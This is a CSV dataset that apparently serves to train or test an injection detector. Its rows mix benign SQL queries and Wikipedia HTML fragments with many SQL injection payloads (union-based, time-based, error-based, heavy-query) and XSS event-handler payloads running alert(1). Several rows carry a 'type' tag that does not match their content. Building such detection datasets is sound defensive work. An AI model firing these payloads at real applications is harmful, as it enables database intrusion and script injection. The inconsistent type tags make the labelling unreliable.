Text,Label,type
"  UPDATE fair SET those =  'wore', City =  'ship' WHERE weak =  possibly",0,sql
"<menu onclick=""alert(1)"">test</menu>",2,xss
"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",1,xss
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  ""uydm""  =  ""uydm",1,sql
SELECT TOP 50 PERCENT * FROM horn SELECT * FROM rain FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM prevent,0,sql
"""hi""""  )   or   (  """"a""""  =  """"a""",1,xss
"INSERT INTO nervous ( eye, figure, in, bark, bone, equipment )  VALUES  ( 'itself', 'taken'. similar', 'sent', 'talk', 'worse', 'dangerous' )  ",0,sql
ward@fortelingenieria.si,0,xss
"  SELECT * FROM pressure WHERE affect NOT IN  ( 'hair', 'shop', 'labor' )  ",0,xss
52930776w,0,xss
lafferty,0,xss
"<a href=""/wiki/Dreyfus%27_critique_of_artificial_intelligence"" class=""mw-redirect"" title=""Dreyfus&#39; critique of artificial intelligence"">Dreyfus' critique of artificial intelligence </a>:",0,xss
"1""   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and ""cbck"" like ""cbck",1,sql
SELECT bottle FROM boy,0,xss
SELECT option_value FROM wp_options WHERE option_name  =  'options_twitter_url' LIMIT 1,0,sql
" select * from users where id  =  1 or $+<\ union select 1,@@VERSION -- 1",1,sql
SELECT * FROM bet WHERE NOT push = 'snow'  AND NOT near = 'could',0,sql
	 </span> </li>,0,xss
"<style>:target {transform: rotate(180deg);}</style><center id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></center>",2,xss
 UPDATE grew SET tax = 'bus'WHERE throughout = 'pictured',0,sql
"<span onmousemove=""alert(1)"">test</span>",2,xss
" SELECT * FROM change ORDER BY labor ASC, especially DESC",0,xss
  </div>,0,xss
"<style>:target {color:red;}</style><image id=x style=""transition:color 1s"" ontransitionend=alert(1)></image>",2,xss
6a0ato,0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 195 )  ORDER BY meta_id ASC",0,sql
SELECT TOP 3 * FROM creature SELECT * FROM except 3SELECT * FROM only,0,xss
"-9837"" where 7201  =  7201 union all select 7201,7201,7201--",1,sql
"c/ comedias, 109,",0,xss
SELECT apple ( s )  FROM rice UNION,0,xss
"1"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""mbas""  =  ""mbas",1,sql
	 </span></a></dt><dd>Send email notifications when certain events occur.</dd>,0,xss
"-3913"" where 6085  =  6085 union all select 6085,6085,6085,6085,6085,6085,6085#",1,sql
"<li><a href=""/wiki/Erich_von_Holst"" title=""Erich von Holst"">Erich von Holst </a> </li>",0,xss
"INSERT INTO difficult  ( explanation, complete, someone )  VALUES  ( 'nervous', 'wear', 'spite' )  ",0,sql
"   SELECT led, paragraph+ ', ' + everyone+ ' ' + write+ ', ' + park AS zulu  FROM original",0,sql
"1'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",1,sql
"<style>:target {transform: rotate(180deg);}</style><main id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></main>",2,xss
SELECT * FROM accurate FETCH FIRST 3 ROWS ONLY,0,sql
<ul>,0,xss
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 416 )  ORDER BY meta_id ASC",0,sql
"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",1,xss
SELECT * FROM written WHERE partly = 'widely' FETCH FIRST 3 ROWS ONLY,0,sql
42685012w,0,sql
"<ul><li><a href=""#CITEREFClark2015"">Clark 2015 </a> </li> </ul>",0,xss
"<audio oncopy=""alert(1)"" contenteditable>test</audio>",2,xss
"<dt><a class=""reference internal"" href=""topics/selectors.html""><span class=""doc"">Selectors",0,xss
28295,0,sql
"   SELECT specific, matter, dailyFROM customs WHERE wave  IS NOT NULL",0,sql
select pg_sleep  (  5  )  # pjvi,1,sql
"<li><i><a href=""/wiki/Superintelligence:_Paths,_Dangers,_Strategies"" title=""Superintelligence: Paths, Dangers, Strategies"">Superintelligence: Paths, Dangers, Strategies </a> </i> </li> </ul>",0,xss
	 </span>,0,xss
2.11181E+15,0,sql
SELECT TOP 3 * FROM copy WHERE out = 'cheese',0,sql
<datalist onpointermove=alert(1)>XSS</datalist>,2,xss
7redil47ta,0,sql
"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;950–952, </li> </ul>",0,xss
d6ntrotr566,0,xss
"<strong onmouseout=""alert(1)"">test</strong>",2,xss
1  )   and   (  7557  =  1711  )  *1711 and   (  5157  =  5157,1,sql
lloros*o,0,sql
"  SELECT dinnerID AS ID, stranger AS language FROM heavy",0,sql
<keygen onblur=alert(1) tabindex=1 id=x></keygen><input autofocus>,2,xss
select 'qqpjq'||  (  select   (  case when   (  2933  =  2933  )   then 1 else 0 end   )    )   ||'qzvzq',1,sql
"<div draggable=""true"" contenteditable>drag me</div><source ondrop=alert(1) contenteditable>drop here</source>",2,xss
"1"" where 3692  =  3692 union all select null,null--",1,sql
SELECT * FROM remove WHERE pool IN  ( SELECT one FROM phrase ) ,0,xss
"calle pintor picasso, 182 5?d",0,xss
SELECT COUNT ( DISTINCT rear )  FROM strike,0,sql
"<style>@keyframes x{}</style><iframe style=""animation-name:x"" onanimationend=""alert(1)""></iframe>",2,xss
SELECT laugh ( s FROM typical RIGHT JOIN,0,sql
<b onpointerover=alert(1)>XSS</b>,2,xss
"-4012""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""ccfn""  =  ""ccfn",1,sql
"1""  )   as ipxg where 4031  =  4031 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,sql
"1""   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  ""znzb"" like ""znzb",1,sql
"<li><a href=""/wiki/Semantics_(computer_science)"" title=""Semantics (computer science)"">Semantics </a> </li> </ul>",0,xss
"   SELECT herself,familiar,excellent,proud,volume     (  (  believed JOIN rate ON character.count =  bound.ride )   INNER JOIN clothesON Orders.valley =  throat.westernID ) ",0,sql
"<tt onclick=""alert(1)"">test</tt>",2,xss
SELECT * FROM may WHERE    NOT find = 'plain',0,sql
-8051  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  5637  =  5637,1,sql
"  SELECT * FROM harbor WHERE butter IN  ( 'correct', 'gain', 'load' )  ",0,sql
mortandad,0,sql
"   SELECT wave, reason+ ', ' + produce+ ' ' + class+ ', ' + or AS behavior  FROM dawn",0,sql
"<basefont onbeforepaste=""alert(1)"" contenteditable>test</basefont>",2,xss
"INSERT INTO fact ( difficult, wherever, movie, page, twice, mistake )  VALUES  ( 'collect', 'park'. room', 'army', 'grow', 'shall', 'board' )  ",0,sql
"<pre onpaste=""alert(1)"" contenteditable>test</pre>",2,xss
"<form ondblclick=""alert(1)"">test</form>",2,xss
SELECT melted FROM strange,0,xss
<html onpointerenter=alert(1)>XSS</html>,2,xss
"calle artigako haritza, s/n 8?d",0,sql
"<s onmouseenter=""alert(1)"">test</s>",2,xss
SELECT TOP 3 * FROM wall WHERE organized = 'willing',0,sql
"-4047'||  (  select 'rqta' from dual where 9743  =  9743 union all select 9743,9743,9743#",1,sql
"-5643'   )    )    union all select 1515,1515#",1,sql
"<noframes onmouseleave=""alert(1)"">test</noframes>",2,xss
 </p>,0,xss
" select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1,sql
"1  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  7338  =  7338",1,sql
FROM  ( SELECT DISTINCT raise FROM spring ) ,0,xss
"<style>@keyframes slidein {}</style><p style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></p>",2,xss
"<li><a href=""/wiki/Physicalism"" title=""Physicalism"">Physicalism </a>",0,xss
po29ip1t0l6,0,xss
SELECT TOP 50 PERCENT * FROM recognize,0,sql
SELECT * FROM stop WHERE to = 'congress' FETCH FIRST 3 ROWS ONLY,0,sql
368,0,xss
"1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#",1,sql
SELECT pot ( s )  FROM hang SELECT know ( s ) ,0,sql
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
" SELECT * FROM angry ORDER BY meant ASC, ask DESC",0,xss
SELECT AVG ( himself ) FROM tip SELECT SUM ( finger ) ,0,sql
"<embed onbeforepaste=""alert(1)"" contenteditable>test</embed>",2,xss
"<article onmousemove=""alert(1)"">test</article>",2,xss
7781,0,xss
pryor,0,xss
"<li class=""toclevel-2 tocsection-74""><a href=""#History_of_AI""><span class=""tocnumber"">13.2 ",0,xss
"	 </span> <span class=""toctext"">Learning ",0,xss
matungo,0,sql
 UNION SELECT,1,xss
"1   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,xss
87853992h,0,sql
"-6951"" union all select 2518,2518,2518,2518,2518,2518,2518,2518--",1,sql
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Lieto, Antonio (May 2018). ""The knowledge level in cognitive architectures: Current limitations and possible developments"". <i>Cognitive Systems Research </i>. <b>48 </b>: 39–55. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.cogsys.2017.05.001"">10.1016/j.cogsys.2017.05.001 </a>. <a href=""/wiki/Handle_System"" title=""Handle System"">hdl </a>:<a rel=""nofollow"" class=""external text"" href=""//hdl.handle.net/2318%2F1665207"">2318/1665207 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Cognitive+Systems+Research&amp;rft.atitle=The+knowledge+level+in+cognitive+architectures%3A+Current+limitations+and+possible+developments&amp;rft.volume=48&amp;rft.pages=39-55&amp;rft.date=2018-05&amp;rft_id=info%3Ahdl%2F2318%2F1665207&amp;rft_id=info%3Adoi%2F10.1016%2Fj.cogsys.2017.05.001&amp;rft.aulast=Lieto&amp;rft.aufirst=Antonio&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
" select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1",1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
7stambrar,0,sql
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",1,sql
"1'  )   where 1646  =  1646 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"1%""  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
SELECT ruler ( s )  FROM liquid,0,xss
17151,0,sql
SELECT AVG ( nails ) FROM principal SELECT SUM ( lungs ) ,0,sql
1  )   as ryks where 1196  =  1196,1,sql
SELECT * FROM use FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
1%'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,sql
senen,0,sql
SELECT COUNT ( warnID ) FROM third,0,xss
"-2001'+  (  select 'nput' where 8368  =  8368 union all select 8368,8368,8368,8368,8368,8368,8368,8368,8368#",1,sql
"1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
1320,0,sql
8855,0,sql
"1""   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""ddun""  =  ""ddun",1,sql
SELECT * FROM popular WHERE grandfather = 'after' FETCH FIRST 3 ROWS ONLY,0,xss
urrupan moger,0,sql
<hr id=x tabindex=1 ondeactivate=alert(1)></hr><input id=y autofocus>,2,xss
"-3316%"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""%""  =  """,1,sql
 </li>,0,xss
ling-yu,0,xss
FROM  ( SELECT DISTINCT dug FROM over ) ,0,sql
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3# sfup",1,sql
SELECT * FROM observe WHERE golden = 'various'  AND  ( character = 'gain' OR ball = 'dirty' ) ,0,sql
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c839e379ee' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,xss
"<keygen draggable=""true"" ondragleave=""alert(1)"">test</keygen>",2,xss
mcbrayne,0,xss
SELECT * FROM bush WHERE five NOT LIKE 'bite%',0,sql
"<li><a href=""/wiki/Intuition"" title=""Intuition"">Intuition </a> </li>",0,xss
SELECT * FROM actually WHERE to NOT LIKE '[life]%',0,sql
11901410z,0,xss
"<shadow oncut=""alert(1)"" contenteditable>test</shadow>",2,xss
SELECT * FROM design,0,sql
1'   )    )     )   and   (  8982  =  8027  )  *8027 and    (    (     (  'qkrv'  =  'qkrv,1,sql
"<li><a href=""/wiki/Computer_accessibility"" title=""Computer accessibility"">Accessibility </a> </li> </ul>",0,xss
1'||  (  select 'dfmw' from dual where 1723  =  1723,1,sql
viena@redesmilitantes.pg,0,xss
SELECT success FROM gate UNION SELECT selection FROM planned ORDER BY outside,0,sql
<animate onpointerleave=alert(1)>XSS</animate>,2,xss
"<li><a href=""/wiki/Glossary_of_economics"" title=""Glossary of economics"">Economics </a> </li>",0,xss
SELECT MIN ( book )  AS noted FROM person,0,sql
"<style>@keyframes x{}</style><audio style=""animation-name:x"" onanimationstart=""alert(1)""></audio>",2,xss
	 </span>,0,xss
-3748' where 9292  =  9292 or 3337  =  2859#,1,sql
"<u draggable=""true"" ondragenter=""alert(1)"">test</u>",2,xss
SELECT AVG ( greatest ) FROM seen,0,sql
"-9954""   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""bifi""  =  ""bifi",1,sql
"<link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r886047268""/>",0,xss
"<div class=""section"" id=""all-the-rest"">",0,xss
descabellar,0,xss
SELECT MIN ( cannot )  AS herd FROM drew,0,sql
SELECT throat,0,sql
"<style>:target {color:red;}</style><keygen id=x style=""transition:color 1s"" ontransitionend=alert(1)></keygen>",2,xss
"	 </span>"" </a>. <i>Business Insider </i>. 25 May 2018<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">6 May ",0,xss
elezaro,0,sql
"1' in boolean mode  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  #",1,sql
rowen,0,xss
chalanera,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"  SELECT Orders.roserID, Employees.bad, Employees.hot FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.troubleID ORDER BY Orders.necessaryID",0,xss
<form onpointerout=alert(1)>XSS</form>,2,xss
" </p><p>Simple exhaustive searches<sup id=""cite_ref-Uninformed_search_188-0"" class=""reference""><a href=""#cite_note-Uninformed_search-188"">&#91;184&#93; </a> </sup> are rarely sufficient for most real-world problems: the <a href=""/wiki/Search_algorithm"" title=""Search algorithm"">search space </a> (the number of places to search) quickly grows to <a href=""/wiki/Astronomically_large"" class=""mw-redirect"" title=""Astronomically large"">astronomical numbers </a>. The result is a search that is <a href=""/wiki/Computation_time"" class=""mw-redirect"" title=""Computation time"">too slow </a> or never completes. The solution, for many problems, is to use ""<a href=""/wiki/Heuristics"" class=""mw-redirect"" title=""Heuristics"">heuristics </a>"" or ""rules of thumb"" that prioritize choices in favor of those that are more likely to reach a goal and to do so in a shorter number of steps. In some search methodologies heuristics can also serve to entirely eliminate some choices that are unlikely to lead to a goal (called ""<a href=""/wiki/Pruning_(algorithm)"" class=""mw-redirect"" title=""Pruning (algorithm)"">pruning </a> the <a href=""/wiki/Search_tree"" title=""Search tree"">search tree </a>""). <a href=""/wiki/Heuristics"" class=""mw-redirect"" title=""Heuristics"">Heuristics </a> supply the program with a ""best guess"" for the path on which the solution lies.<sup id=""cite_ref-Informed_search_189-0"" class=""reference""><a href=""#cite_note-Informed_search-189"">&#91;185&#93; </a> </sup> Heuristics limit the search for solutions into a smaller sample size.<sup id=""cite_ref-FOOTNOTETecuci2012_130-1"" class=""reference""><a href=""#cite_note-FOOTNOTETecuci2012-130"">&#91;127&#93; </a> </sup>",0,xss
"<style>@keyframes x{}</style><article style=""animation-name:x"" onanimationend=""alert(1)""></article>",2,xss
	 </span> </li>,0,xss
<strong onpointerout=alert(1)>XSS</strong>,2,xss
SELECT TOP 50 PERCENT * FROM seed,0,sql
